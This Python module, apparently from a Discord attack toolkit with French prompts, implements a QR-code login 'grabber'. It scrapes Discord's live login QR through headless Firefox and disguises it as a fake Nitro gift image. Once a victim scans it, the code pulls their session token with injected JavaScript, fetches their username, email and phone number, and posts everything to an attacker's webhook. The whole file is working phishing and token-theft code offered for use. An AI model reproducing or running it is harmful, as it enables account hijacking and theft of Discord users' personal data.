from assets.plugin.common.base import *

#main
def discord_qr():
    
    rpc("QR grabber")
    detect_gecko()
    if os.path.exists(f"{program_file}\\Mozilla Firefox\\firefox.exe") == True:
        firefox_path = f"{program_file}\\Mozilla Firefox\\firefox.exe" 
    elif os.path.exists(f"{program_file_x86}\\Mozilla Firefox\\firefox.exe") == True:
        firefox_path = f"{program_file_x86}\\Mozilla Firefox\\firefox.exe"
    elif os.path.exists(f"{program_file_2}\\Mozilla Firefox\\firefox.exe") == True:
        firefox_path = f"{program_file_2}\\Mozilla Firefox\\firefox.exe"
    else:
        clear()
        driver_err_banner()
        firefox_path = input(f"{y}[{w}#{y}]{w}Le navigateur firefox n'est pas detecté !...\n{y}[{w}#{y}]{w}Est-il installé?\n=~=~=\n{y}[{w}#{y}]{w}Si oui entrez le chemin d'acces ici:\n>>>")
        firefox_path = f"{program_file}\\Mozilla Firefox\\firefox.exe"
    
    clear()
    qr_grabber_banner()
    webhook_url = input(f"{y}[{w}#{y}]{w}Enter your webhook here:\n>>>")
    clear()
    qr_grabber_banner()
    print(f"{y}[{w}LOG{y}]{w} QR code en cours de création...")
    
    opts = webdriver.FirefoxOptions()
    opts.headless = True
    opts.binary = firefox_path
    driver = webdriver.Firefox(options=opts, executable_path=r'geckodriver.exe')
    logo = Image.open(f'{getcwd()}\\assets\\plugin\\common\\utils\\overlay.png')
    img_1 = Image.open(f'{getcwd()}\\assets\\plugin\\common\\utils\\template.png', 'r')

    def template_try():
        try:
            soup = BeautifulSoup(driver.page_source, features='lxml')
            classe = soup.find('div', {'class': 'qrCode-2R7t9S'})
            qrcode = classe.find('img')['src']
            global imgbase64
            imgbase64 = b64decode(qrcode.replace('data:image/png;base64,', ''))
        except:
            sleep(1)
            template_try()
    
    driver.get('https://discord.com/login')
    sleep(3)
    template_try()
    
    if os.path.exists(f"{getcwd()}\\tool-outputs") == False:
        makedirs(f"{getcwd()}\\tool-outputs")
    else:
        if os.path.exists(f"{getcwd()}\\tool-outputs\\simple-qr.png") == True:
            remove(f"{getcwd()}\\tool-outputs\\simple-qr.png")
        elif os.path.exists(f"{getcwd()}\\tool-outputs\\fake-nitro.png") == True:
            remove(f"{getcwd()}\\tool-outputs\\simple-qr.png")
    
    with open(f'{getcwd()}\\tool-outputs\\qr.png','wb') as f:
        f.write(imgbase64)
    img_qr_big = Image.open(f'{getcwd()}\\tool-outputs\\qr.png').convert('RGB')
    img_qr_big.paste(logo, ((img_qr_big.size[0] - logo.size[0]) // 2, (img_qr_big.size[1] - logo.size[1]) // 2))
    img_1.paste(img_qr_big, (120, 409))
    img_1.save(f"{getcwd()}\\tool-outputs\\fake-nitro.png")
    rename(f'{getcwd()}\\tool-outputs\\qr.png', f"{getcwd()}\\tool-outputs\\simple-qr.png")

    
    clear()
    qr_grabber_banner()
    print(f"{y}[{w}#{y}]{w}Les QR sont prêts à être scannés, ils se trouvent dans:\n{y}[{w}>{y}]{w}Dossier -> {getcwd()}\\tool-outputs")

    current_url=driver.current_url
    while 1 == 1:
        if driver.current_url != current_url:
            tk = driver.execute_script(''' return (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken(); ''')
            driver.close()
            break

    print(f"QR scanned...\nSending all infomations in: {webhook_url}...\n")

    headers = {'Authorization': tk}
    response = get('https://discordapp.com/api/v6/users/@me', headers=headers).json()
    usr_name = f"{response['username']}#{response['discriminator']}"
    email = response['email']
    phone = response['phone']

    webhook = DiscordWebhook(url=webhook_url, rate_limit_retry=True , )
    grabber_embed = DiscordEmbed(title=f"***{usr_name} informations:***", description=f'***Token:***\n```{tk}```\n***Mail:***\n```{email}```\n***Phone num:***\n```{phone}```', color='ff0000')
    webhook.add_embed(grabber_embed)
    response = webhook.execute()

    clear()
    qr_grabber_banner()
    input(f"{y}[{w}LOG{y}]{w} Les infos de {usr_name} ont été envoyé dans le webhook avec succès !")

